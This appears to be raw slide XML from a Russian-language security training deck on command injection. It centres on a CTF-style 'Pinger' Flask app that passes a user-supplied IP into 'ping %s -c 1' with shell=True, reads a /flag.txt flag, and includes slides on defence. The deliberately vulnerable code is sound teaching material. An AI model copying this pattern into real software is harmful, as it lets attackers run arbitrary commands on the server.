                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14EA0201-965C-4AED-A5AB-2732F4000F89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1263968"/>
            <a:ext cx="5596890" cy="514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4474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create_resp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message: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1125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str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-&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1125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dict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25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str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125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str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jsonify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1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"message"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 message</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="112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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1125" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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@app.route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"/"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4474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()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render_template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"index.html"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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1125" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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@app.route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"/api/pinger"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25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methods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2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'POST'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="112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4474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pinger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()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data = </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1125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.loads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request.data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"ip"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data:</a:t>
            </a:r>
          </a:p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create_resp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"The IP address was not specified"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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1125" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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data = run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"ping %s -c 1"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% data</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="112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"ip"</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="112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25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capture_output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25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25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shell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25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25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25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data.stderr:</a:t>
            </a:r>
          </a:p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create_resp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data.stderr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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1125" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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create_resp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data.stdout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450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1125" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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4474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read_flag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()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5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Path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'/flag.txt'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.read_text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5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encoding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'utf-8'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.strip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()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPts val="450"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr sz="1125" b="0">
              <a:solidFill>
                <a:srgbClr val="FFD700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@app.get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'/healthz'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4474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health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()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read_flag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()</a:t>
            </a:r>
          </a:p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jsonify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5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'ready'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OSError:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="11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jsonify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5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'unavailable'</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="11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2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503</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="preserved-code-highlight-run"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="657225" y="3152775"/>
            <a:ext cx="5600700" cy="3619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94980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">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48E4469E-243F-4988-93B9-FC15DC5001B2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Pinger: путь данных через shell</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="process-node-browser">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4743126-371C-4362-AF30-041279B5D3DE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2190750" cy="314325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8D9B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browser-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF16D6FA-5C00-4B93-ABA0-82918AF9C608}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="800100" y="323850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Браузер</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="browser-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12DF48A9-DD9C-41B3-B7E2-DCC8DFEE7C3A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="3724275"/>
            <a:ext cx="1885950" cy="174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JSON: ip</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1650" b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JSON: message</a:t>
            </a:r>
          </a:p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Вывод через</a:t>
            </a:r>
          </a:p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textContent</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="process-node-flask">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED78C5ED-3D0C-47A1-A7BF-736803D38E7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3562350" y="2419350"/>
            <a:ext cx="2190750" cy="314325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flask-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{063EB953-1E6E-459B-AA0B-83A7226AAE7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3676650" y="323850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Flask</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="flask-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{13FA77A2-24CB-4FE4-B4C5-9F6C34427448}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3714750" y="3724275"/>
            <a:ext cx="1885950" cy="174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Читает ip</a:t>
            </a:r>
          </a:p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Собирает строку</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1650" b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Выбирает вывод</a:t>
            </a:r>
          </a:p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Возвращает JSON</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="process-node-shell">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5B7E8D8-9D9A-4369-8252-A3BD317AA443}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6438900" y="2419350"/>
            <a:ext cx="2190750" cy="314325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ell-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{79D4F014-4DC7-47C2-BD49-E10B66E8E08E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553200" y="323850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/bin/sh</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="shell-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A011C254-3A1B-4693-A99F-C5ACAACA0494}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6591300" y="3724275"/>
            <a:ext cx="1885950" cy="174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Разбирает строку</a:t>
            </a:r>
          </a:p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и операторы</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1650" b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Запускает</a:t>
            </a:r>
          </a:p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процессы</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="process-node-process">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{530B6BE6-8DB4-4981-9500-C0B9C5F87B43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9315450" y="2419350"/>
            <a:ext cx="2190750" cy="3143250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process-title">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2BF0963A-0E0F-47F8-BB09-D5CF12BEF916}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9429750" y="323850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Процесс</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="process-body">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8DD505B3-D090-4F58-9E0B-D8225B0AECFF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9467850" y="3724275"/>
            <a:ext cx="1885950" cy="174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Команды ОС</a:t>
            </a:r>
          </a:p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ping и другие</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr sz="1650" b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  <a:p>
            <a:pPr algn="ctr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stdout и stderr</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="flow-request">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B1D5CFC-789E-4BFF-B122-15AAE9910C56}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2876550" y="3238500"/>
            <a:ext cx="685800" cy="0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5" name="flow-label-request">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{18BDBF8F-102C-4E61-A6F1-49308F53F6AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2876550" y="267652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JSON:</a:t>
            </a:r>
          </a:p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ip</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="flow-command">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83B893DE-7E81-43AF-888F-29D9B83FDBA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5753100" y="3238500"/>
            <a:ext cx="685800" cy="0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7" name="flow-label-command">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{410BCC82-8E52-49D5-8EE9-32BD2E5C89F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5753100" y="280987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Строка</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="18" name="flow-start">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60F92532-1D46-4C73-B82F-2DB20FB8BF1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8629650" y="3238500"/>
            <a:ext cx="685800" cy="0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9" name="flow-label-start">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8385008E-8294-4574-992C-4208F09B2A1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8629650" y="280987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Запуск</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="flow-streams">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{49F70EDF-46B8-425E-9E67-452A4CD47FC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8629650" y="4981575"/>
            <a:ext cx="685800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="flow-label-streams">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9368A1A1-2175-4EAF-84BE-A7D937BC7A92}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8629650" y="509587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stdout</a:t>
            </a:r>
          </a:p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stderr</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="22" name="flow-capture">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C7173752-BC3C-4CCB-86E3-CD6C69AFFA8D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5753100" y="4981575"/>
            <a:ext cx="685800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="flow-label-capture">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0757A9E4-5B71-4AE3-B5D6-2F197EA28991}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5753100" y="51435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Вывод</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="24" name="flow-response">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FC48CCB-63E6-420A-B5C8-4A9D2B77D840}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2876550" y="4981575"/>
            <a:ext cx="685800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="23813">
            <a:solidFill>
              <a:srgbClr val="8D9BA5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:headEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="flow-label-response">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5BF49AB2-1DDC-49EA-A451-6845D73596FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2876550" y="51435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JSON</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="selection">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{602665B9-01C3-445C-84D7-37ECE98F99DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5943600"/>
            <a:ext cx="1019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Flask возвращает непустой stderr, иначе stdout. Браузер выводит поле message как текст.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="component-laptop-29">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F38D8F23-0D11-4579-A8A3-7C43522D03A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1595437" y="2609850"/>
            <a:ext cx="371475" cy="278606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component-laptop-30">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60554608-60AF-4C8B-B1EF-95E101FCFE9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1533525" y="2888456"/>
            <a:ext cx="495300" cy="108347"/>
          </a:xfrm>
          <a:prstGeom prst="trapezoid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component-server-31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{374AA910-E7E0-403C-A9D3-6B88A4199B65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4410075" y="2609850"/>
            <a:ext cx="495300" cy="141514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component-server-32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7EB15CC-B68A-496A-8F10-A6861B9F984D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4816928" y="2654074"/>
            <a:ext cx="35378" cy="35378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component-server-33">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{48C47EBB-174E-4E35-9D84-D89EBA4928B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4410075" y="2786742"/>
            <a:ext cx="495300" cy="141514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component-server-34">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010AE264-8A77-4442-8085-993090309F69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4816928" y="2830966"/>
            <a:ext cx="35378" cy="35378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component-server-35">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FA25DBE-085B-44B1-A38A-5E2B3762CB1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4410075" y="2963635"/>
            <a:ext cx="495300" cy="141514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component-server-36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA936154-4099-403E-B3FF-A05C438C10A0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4816928" y="3007860"/>
            <a:ext cx="35378" cy="35378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component-terminal-37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2316AD9D-ADB8-43C9-BAD9-8D1FD1466429}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7286625" y="2609850"/>
            <a:ext cx="495300" cy="424544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component-terminal-38">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04862E22-9851-4273-A995-FE2CD5BB4491}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7375072" y="2715985"/>
            <a:ext cx="123826" cy="176894"/>
          </a:xfrm>
          <a:prstGeom prst="chevron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component-terminal-39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2316AD9D-ADB8-43C9-BAD9-8D1FD1466429}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10163175" y="2609850"/>
            <a:ext cx="495300" cy="424544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component-terminal-40">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04862E22-9851-4273-A995-FE2CD5BB4491}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10251622" y="2715985"/>
            <a:ext cx="123826" cy="176894"/>
          </a:xfrm>
          <a:prstGeom prst="chevron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8" name="Рисунок 32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C6370F15-0715-4A26-9572-092AD74A8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7214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FE4B8D5-5A1B-47CB-8FC6-13A199BE725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marL="0" marR="0" lvl="0" indent="0" algn="l" defTabSz="91440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Pinger</a:t>
            </a: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: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="ru-RU" sz="33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пол</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="3300" b="1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учаем</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="3300" b="1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флаг</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" sz="3300" b="1" i="0" u="none" strike="noStrike" kern="1200" cap="none" spc="0" normalizeH="0" baseline="0" noProof="0" dirty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F9C1B7-EF20-48AF-9312-609D57FD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28B06E-0628-4C5F-A2FA-67B5A510C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393698"/>
            <a:ext cx="9887458" cy="494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87193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250458F5-B020-49DB-92ED-28954781D8FD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Pinger: защита от Command Injection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3CBE338-4348-4E56-B16F-8418CC42C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3" name="v17-text-78">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6FD320A3-9B8A-4805-989F-2EAA0DA3179F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5067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8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Как не надо</a:t>
            </a:r>
